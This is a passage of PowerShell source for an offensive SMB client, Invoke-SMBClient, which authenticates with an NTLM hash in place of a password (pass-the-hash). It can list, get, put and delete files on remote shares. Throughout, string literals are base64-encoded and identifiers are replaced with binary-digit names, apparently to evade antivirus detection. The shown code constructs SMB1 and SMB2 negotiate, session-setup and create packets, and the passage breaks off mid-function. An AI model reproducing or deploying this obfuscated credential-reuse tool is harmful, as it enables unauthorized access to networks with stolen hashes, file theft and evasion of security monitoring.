function Invoke-SMBClient
{
[CmdletBinding(DefaultParametersetName='Default')]
param
(
    [parameter(Mandatory=$false)][ValidateSet("List","Recurse","Get","Put","Delete")][String]$Action = "List",
    [parameter(Mandatory=$false)][String]$Destination,
    [parameter(ParameterSetName='Auth',Mandatory=$true)][String]$Username,
    [parameter(ParameterSetName='Auth',Mandatory=$false)][String]$Domain,
    [parameter(Mandatory=$true)][Object]$Source,
    [parameter(ParameterSetName='Auth',Mandatory=$true)][ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})][String]$Hash,
    [parameter(Mandatory=$false)][Switch]$Modify,
    [parameter(Mandatory=$false)][Switch]$NoProgress,
    [parameter(Mandatory=$false)][ValidateSet("Auto","1","2.1")][String]$Version="Auto",
    [parameter(ParameterSetName='Session',Mandatory=$false)][Int]$Session,
    [parameter(ParameterSetName='Session',Mandatory=$false)][Switch]$Logoff,
    [parameter(ParameterSetName='Session',Mandatory=$false)][Switch]$Refresh,
    [parameter(Mandatory=$false)][Int]$Sleep=100
)
if($Version -eq '1')
{
    ${10100011001111100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMQA=')))
}
elseif($Version -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgAuADEA'))))
{
    ${10100011001111100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMgAuADEA')))
}
if($PsCmdlet.ParameterSetName -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaAA='))) -and $PsCmdlet.ParameterSetName -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgA='))))
{
    ${10101001101101001} = $true
}
function _00001101111001010
{
    param(${_10100101010111011})
    ForEach(${10101111000011100} in ${_10100101010111011}.Values)
    {
        ${10110111100001000} += ${10101111000011100}
    }
    return ${10110111100001000}
}
function _01001110110110100
{
    param([Int]${_00100000111111110},[Int]${_00001111111010000})
    [Byte[]]${_10011010011010110} = ([System.BitConverter]::GetBytes(${_00100000111111110} + ${_00001111111010000}))[2..0]
    ${01100000100100011} = New-Object System.Collections.Specialized.OrderedDictionary
    ${01100000100100011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAHMAcwBhAGcAZQBUAHkAcABlAA=='))),[Byte[]](0x00))
    ${01100000100100011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABlAG4AZwB0AGgA'))),${_10011010011010110})
    return ${01100000100100011}
}
function _10001001110101001
{
    param([Byte[]]${_00101010111101011},[Byte[]]${_00101001001111011},[Byte[]]${_01011110001110111},[Byte[]]${_01110001110011000},[Byte[]]${_00010111001001100},[Byte[]]${_00101000011000101})
    ${_00010111001001100} = ${_00010111001001100}[0,1]
    ${00111010101101011} = New-Object System.Collections.Specialized.OrderedDictionary
    ${00111010101101011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AdABvAGMAbwBsAA=='))),[Byte[]](0xff,0x53,0x4d,0x42))
    ${00111010101101011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBhAG4AZAA='))),${_00101010111101011})
    ${00111010101101011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByAEMAbABhAHMAcwA='))),[Byte[]](0x00))
    ${00111010101101011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00))
    ${00111010101101011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByAEMAbwBkAGUA'))),[Byte[]](0x00,0x00))
    ${00111010101101011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))),${_00101001001111011})
    ${00111010101101011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzADIA'))),${_01011110001110111})
    ${00111010101101011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwBJAEQASABpAGcAaAA='))),[Byte[]](0x00,0x00))
    ${00111010101101011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA'))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    ${00111010101101011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkADIA'))),[Byte[]](0x00,0x00))
    ${00111010101101011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBJAEQA'))),${_01110001110011000})
    ${00111010101101011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwBJAEQA'))),${_00010111001001100})
    ${00111010101101011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBJAEQA'))),${_00101000011000101})
    ${00111010101101011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQB1AGwAdABpAHAAbABlAHgASQBEAA=='))),[Byte[]](0x00,0x00))
    return ${00111010101101011}
}
function _10110000100111010
{
    param([String]$Version)
    if($version -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMQA='))))
    {
        [Byte[]]${10011111011111111} = 0x0c,0x00
    }
    else
    {
        [Byte[]]${10011111011111111} = 0x22,0x00  
    }
    ${10100000000100110} = New-Object System.Collections.Specialized.OrderedDictionary
    ${10100000000100110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBvAHIAZABDAG8AdQBuAHQA'))),[Byte[]](0x00))
    ${10100000000100110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB5AHQAZQBDAG8AdQBuAHQA'))),${10011111011111111})
    ${10100000000100110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBlAHMAdABlAGQARABpAGEAbABlAGMAdABzAF8ARABpAGEAbABlAGMAdABfAEIAdQBmAGYAZQByAEYAbwByAG0AYQB0AA=='))),[Byte[]](0x02))
    ${10100000000100110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBlAHMAdABlAGQARABpAGEAbABlAGMAdABzAF8ARABpAGEAbABlAGMAdABfAE4AYQBtAGUA'))),[Byte[]](0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00))
    if($version -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMQA='))))
    {
        ${10100000000100110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBlAHMAdABlAGQARABpAGEAbABlAGMAdABzAF8ARABpAGEAbABlAGMAdABfAEIAdQBmAGYAZQByAEYAbwByAG0AYQB0ADIA'))),[Byte[]](0x02))
        ${10100000000100110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBlAHMAdABlAGQARABpAGEAbABlAGMAdABzAF8ARABpAGEAbABlAGMAdABfAE4AYQBtAGUAMgA='))),[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x30,0x30,0x32,0x00))
        ${10100000000100110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBlAHMAdABlAGQARABpAGEAbABlAGMAdABzAF8ARABpAGEAbABlAGMAdABfAEIAdQBmAGYAZQByAEYAbwByAG0AYQB0ADMA'))),[Byte[]](0x02))
        ${10100000000100110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBlAHMAdABlAGQARABpAGEAbABlAGMAdABzAF8ARABpAGEAbABlAGMAdABfAE4AYQBtAGUAMwA='))),[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x3f,0x3f,0x3f,0x00))
    }
    return ${10100000000100110}
}
function _01101101000011000
{
    param([Byte[]]${_10101100101100100})
    [Byte[]]${10011111011111111} = [System.BitConverter]::GetBytes(${_10101100101100100}.Length)[0,1]
    [Byte[]]${10101100110010101} = [System.BitConverter]::GetBytes(${_10101100101100100}.Length + 5)[0,1]
    ${00001101101001110} = New-Object System.Collections.Specialized.OrderedDictionary
    ${00001101101001110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBvAHIAZABDAG8AdQBuAHQA'))),[Byte[]](0x0c))
    ${00001101101001110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAGQAWABDAG8AbQBtAGEAbgBkAA=='))),[Byte[]](0xff))
    ${00001101101001110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00))
    ${00001101101001110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAGQAWABPAGYAZgBzAGUAdAA='))),[Byte[]](0x00,0x00))
    ${00001101101001110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAQgB1AGYAZgBlAHIA'))),[Byte[]](0xff,0xff))
    ${00001101101001110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgATQBwAHgAQwBvAHUAbgB0AA=='))),[Byte[]](0x02,0x00))
    ${00001101101001110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBDAE4AdQBtAGIAZQByAA=='))),[Byte[]](0x01,0x00))
    ${00001101101001110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBLAGUAeQA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${00001101101001110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AEIAbABvAGIATABlAG4AZwB0AGgA'))),${10011111011111111})
    ${00001101101001110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkADIA'))),[Byte[]](0x00,0x00,0x00,0x00))
    ${00001101101001110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAHAAYQBiAGkAbABpAHQAaQBlAHMA'))),[Byte[]](0x44,0x00,0x00,0x80))
    ${00001101101001110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB5AHQAZQBDAG8AdQBuAHQA'))),${10101100110010101})
    ${00001101101001110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AEIAbABvAGIA'))),${_10101100101100100})
    ${00001101101001110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAHQAaQB2AGUATwBTAA=='))),[Byte[]](0x00,0x00,0x00))
    ${00001101101001110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAHQAaQB2AGUATABBAE4ATQBhAG4AYQBnAGUA'))),[Byte[]](0x00,0x00))
    return ${00001101101001110} 
}
function _01000000100101100
{
    param([Byte[]]${_00101010111101011},[Byte[]]${_00100001010000000},[Bool]${_00101010110110111},[Int]${_10000100100010100},[Byte[]]${_00010111001001100},[Byte[]]${_01110001110011000},[Byte[]]${_10010011001100110})
    if(${_00101010110110111})
    {
        ${_00101001001111011} = 0x08,0x00,0x00,0x00      
    }
    else
    {
        ${_00101001001111011} = 0x00,0x00,0x00,0x00
    }
    [Byte[]]${01101111101011000} = [System.BitConverter]::GetBytes(${_10000100100010100})
    if(${01101111101011000}.Length -eq 4)
    {
        ${01101111101011000} += 0x00,0x00,0x00,0x00
    }
    ${01100110000110010} = New-Object System.Collections.Specialized.OrderedDictionary
    ${01100110000110010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AdABvAGMAbwBsAEkARAA='))),[Byte[]](0xfe,0x53,0x4d,0x42))
    ${01100110000110010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x40,0x00))
    ${01100110000110010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABpAHQAQwBoAGEAcgBnAGUA'))),[Byte[]](0x01,0x00))
    ${01100110000110010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAbgBuAGUAbABTAGUAcQB1AGUAbgBjAGUA'))),[Byte[]](0x00,0x00))
    ${01100110000110010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00,0x00))
    ${01100110000110010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBhAG4AZAA='))),${_00101010111101011})
    ${01100110000110010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABpAHQAUgBlAHEAdQBlAHMAdAA='))),${_00100001010000000})
    ${01100110000110010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))),${_00101001001111011})
    ${01100110000110010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHgAdABDAG8AbQBtAGEAbgBkAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${01100110000110010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAHMAcwBhAGcAZQBJAEQA'))),${01101111101011000})
    ${01100110000110010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwBJAEQA'))),${_00010111001001100})
    ${01100110000110010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBJAEQA'))),${_01110001110011000})
    ${01100110000110010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBJAEQA'))),${_10010011001100110})
    ${01100110000110010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA'))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    return ${01100110000110010}
}
function _10101000001010011
{
    ${00100011101111000} = New-Object System.Collections.Specialized.OrderedDictionary
    ${00100011101111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x24,0x00))
    ${00100011101111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGEAbABlAGMAdABDAG8AdQBuAHQA'))),[Byte[]](0x02,0x00))
    ${00100011101111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AbwBkAGUA'))),[Byte[]](0x01,0x00))
    ${00100011101111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00,0x00))
    ${00100011101111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAHAAYQBiAGkAbABpAHQAaQBlAHMA'))),[Byte[]](0x40,0x00,0x00,0x00))
    ${00100011101111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGkAZQBuAHQARwBVAEkARAA='))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    ${00100011101111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAGcAbwB0AGkAYQB0AGUAQwBvAG4AdABlAHgAdABPAGYAZgBzAGUAdAA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${00100011101111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAGcAbwB0AGkAYQB0AGUAQwBvAG4AdABlAHgAdABDAG8AdQBuAHQA'))),[Byte[]](0x00,0x00))
    ${00100011101111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkADIA'))),[Byte[]](0x00,0x00))
    ${00100011101111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGEAbABlAGMAdAA='))),[Byte[]](0x02,0x02))
    ${00100011101111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGEAbABlAGMAdAAyAA=='))),[Byte[]](0x10,0x02))
    return ${00100011101111000}
}
function _01110111011011000
{
    param([Byte[]]${_10101100101100100})
    [Byte[]]${10111000001001010} = ([System.BitConverter]::GetBytes(${_10101100101100100}.Length))[0,1]
    ${10110101111111000} = New-Object System.Collections.Specialized.OrderedDictionary
    ${10110101111111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x19,0x00))
    ${10110101111111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))),[Byte[]](0x00))
    ${10110101111111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AbwBkAGUA'))),[Byte[]](0x01))
    ${10110101111111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAHAAYQBiAGkAbABpAHQAaQBlAHMA'))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10110101111111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAbgBuAGUAbAA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10110101111111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AEIAdQBmAGYAZQByAE8AZgBmAHMAZQB0AA=='))),[Byte[]](0x58,0x00))
    ${10110101111111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AEIAdQBmAGYAZQByAEwAZQBuAGcAdABoAA=='))),${10111000001001010})
    ${10110101111111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGUAdgBpAG8AdQBzAFMAZQBzAHMAaQBvAG4ASQBEAA=='))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    ${10110101111111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIA'))),${_10101100101100100})
    return ${10110101111111000} 
}
function _10100111010010000
{
    param([Byte[]]${_10101101000001010})
    [Byte[]]${01100100111100001} = ([System.BitConverter]::GetBytes(${_10101101000001010}.Length))[0,1]
    ${10011101101111011} = New-Object System.Collections.Specialized.OrderedDictionary
    ${10011101101111011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x09,0x00))
    ${10011101101111011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00,0x00))
    ${10011101101111011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaABPAGYAZgBzAGUAdAA='))),[Byte[]](0x48,0x00))
    ${10011101101111011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaABMAGUAbgBnAHQAaAA='))),${01100100111100001})
    ${10011101101111011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIA'))),${_10101101000001010})
    return ${10011101101111011}
}
function _00011110111010101
{
    param([Byte[]]${_00000110011111000},[Int]${_01000111101111101},[Int64]${_01001101000001000})
    if(${_00000110011111000})
    {
        ${00001010110010011} = [System.BitConverter]::GetBytes(${_00000110011111000}.Length)[0,1]
    }
    else
    {
        ${_00000110011111000} = 0x00,0x00,0x69,0x00,0x6e,0x00,0x64,0x00
        ${00001010110010011} = 0x00,0x00
    }
    if(${_01000111101111101})
    {
        [Byte[]]${10011110100100100} = 0x80,0x00,0x10,0x00
        [Byte[]]${10100001001000001} = 0x00,0x00,0x00,0x00
        [Byte[]]${00110100010101101} = 0x00,0x00,0x00,0x00
        [Byte[]]${01101001000001000} = 0x21,0x00,0x00,0x00
        [Byte[]]${10001111011111001} = [System.BitConverter]::GetBytes(${_00000110011111000}.Length)
        if(${_01000111101111101} -eq 1)
        {
            [Byte[]]${01101000100111011} = 0x58,0x00,0x00,0x00
        }
        elseif(${_01000111101111101} -eq 2)
        {
            [Byte[]]${01101000100111011} = 0x90,0x00,0x00,0x00
        }
        else
        {
            [Byte[]]${01101000100111011} = 0xb0,0x00,0x00,0x00
            [Byte[]]${00010000001100101} = [System.BitConverter]::GetBytes(${_01001101000001000})
        }
        if(${_00000110011111000})
        {
            [String]${10000001011010011} = ${_00000110011111000}.Length / 8
            if(${10000001011010011} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuADcANQA='))))
            {
                ${_00000110011111000} += 0x04,0x00
            }
            elseif(${10000001011010011} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuADUA'))))
            {
                ${_00000110011111000} += 0x00,0x00,0x00,0x00
            }
            elseif(${10000001011010011} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuADIANQA='))))
            {
               ${_00000110011111000} += 0x00,0x00,0x00,0x00,0x00,0x00
            }
        }
        [Byte[]]${10001111011111001} = [System.BitConverter]::GetBytes(${_00000110011111000}.Length + 120)
    }
    else
    {
        [Byte[]]${10011110100100100} = 0x03,0x00,0x00,0x00
        [Byte[]]${10100001001000001} = 0x80,0x00,0x00,0x00
        [Byte[]]${00110100010101101} = 0x01,0x00,0x00,0x00
        [Byte[]]${01101001000001000} = 0x40,0x00,0x00,0x00
        [Byte[]]${10001111011111001} = 0x00,0x00,0x00,0x00
        [Byte[]]${01101000100111011} = 0x00,0x00,0x00,0x00
    }
    [String]${00110111111001000} = [String](1..16 | % {$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAAyAH0A'))) -f (Get-Random -Minimum 1 -Maximum 255)})
    [Byte[]]${00110111111001000} = ${00110111111001000}.Split(" ") | %{[Char][System.Convert]::ToInt16($_,16)}
    ${00001001110110101} = New-Object System.Collections.Specialized.OrderedDictionary
    ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x39,0x00))
    ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))),[Byte[]](0x00))
    ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBlAHMAdABlAGQATwBwAGwAbwBjAGsATABlAHYAZQBsAA=='))),[Byte[]](0x00))
    ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAZQByAHMAbwBuAGEAdABpAG8AbgA='))),[Byte[]](0x02,0x00,0x00,0x00))
    ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAQwByAGUAYQB0AGUARgBsAGEAZwBzAA=='))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAaQByAGUAZABBAGMAYwBlAHMAcwA='))),${10011110100100100})
    ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBBAHQAdAByAGkAYgB1AHQAZQBzAA=='))),${10100001001000001})
    ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGEAcgBlAEEAYwBjAGUAcwBzAA=='))),${00110100010101101})
    ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUARABpAHMAcABvAHMAaQB0AGkAbwBuAA=='))),[Byte[]](0x01,0x00,0x00,0x00))
    ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUATwBwAHQAaQBvAG4AcwA='))),${01101001000001000})
    ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQBPAGYAZgBzAGUAdAA='))),[Byte[]](0x78,0x00))
    ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQBMAGUAbgBnAHQAaAA='))),${00001010110010011})
    ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAQwBvAG4AdABlAHgAdABzAE8AZgBmAHMAZQB0AA=='))),${10001111011111001})
    ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAQwBvAG4AdABlAHgAdABzAEwAZQBuAGcAdABoAA=='))),${01101000100111011})
    ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIA'))),${_00000110011111000})
    if(${_01000111101111101})
    {
        ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAEkAbgBmAG8AXwBDAGgAYQBpAG4ARQBsAGUAbQBlAG4AdABEAEgAbgBRAF8AQwBoAGEAaQBuAE8AZgBmAHMAZQB0AA=='))),[Byte[]](0x28,0x00,0x00,0x00))
        ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAEkAbgBmAG8AXwBDAGgAYQBpAG4ARQBsAGUAbQBlAG4AdABEAEgAbgBRAF8AVABhAGcAXwBPAGYAZgBzAGUAdAA='))),[Byte[]](0x10,0x00))
        ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAEkAbgBmAG8AXwBDAGgAYQBpAG4ARQBsAGUAbQBlAG4AdABEAEgAbgBRAF8AVABhAGcAXwBMAGUAbgBnAHQAaAA='))),[Byte[]](0x04,0x00,0x00,0x00))
        ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAEkAbgBmAG8AXwBDAGgAYQBpAG4ARQBsAGUAbQBlAG4AdABEAEgAbgBRAF8ARABhAHQAYQBfAE8AZgBmAHMAZQB0AA=='))),[Byte[]](0x18,0x00))
        ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAEkAbgBmAG8AXwBDAGgAYQBpAG4ARQBsAGUAbQBlAG4AdABEAEgAbgBRAF8ARABhAHQAYQBfAEwAZQBuAGcAdABoAA=='))),[Byte[]](0x10,0x00,0x00,0x00))
        ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAEkAbgBmAG8AXwBDAGgAYQBpAG4ARQBsAGUAbQBlAG4AdABEAEgAbgBRAF8AVABhAGcA'))),[Byte[]](0x44,0x48,0x6e,0x51))
        ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAEkAbgBmAG8AXwBDAGgAYQBpAG4ARQBsAGUAbQBlAG4AdABEAEgAbgBRAF8AVQBuAGsAbgBvAHcAbgA='))),[Byte[]](0x00,0x00,0x00,0x00))
        ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAEkAbgBmAG8AXwBDAGgAYQBpAG4ARQBsAGUAbQBlAG4AdABEAEgAbgBRAF8ARABhAHQAYQBfAEcAVQBJAEQASABhAG4AZABsAGUA'))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        if(${_01000111101111101} -eq 3)
        {
            ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAEkAbgBmAG8AXwBDAGgAYQBpAG4ARQBsAGUAbQBlAG4AdABBAGwAUwBpAF8AQwBoAGEAaQBuAE8AZgBmAHMAZQB0AA=='))),[Byte[]](0x20,0x00,0x00,0x00))
            ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAEkAbgBmAG8AXwBDAGgAYQBpAG4ARQBsAGUAbQBlAG4AdABBAGwAUwBpAF8AVABhAGcAXwBPAGYAZgBzAGUAdAA='))),[Byte[]](0x10,0x00))
            ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAEkAbgBmAG8AXwBDAGgAYQBpAG4ARQBsAGUAbQBlAG4AdABBAGwAUwBpAF8AVABhAGcAXwBMAGUAbgBnAHQAaAA='))),[Byte[]](0x04,0x00,0x00,0x00))
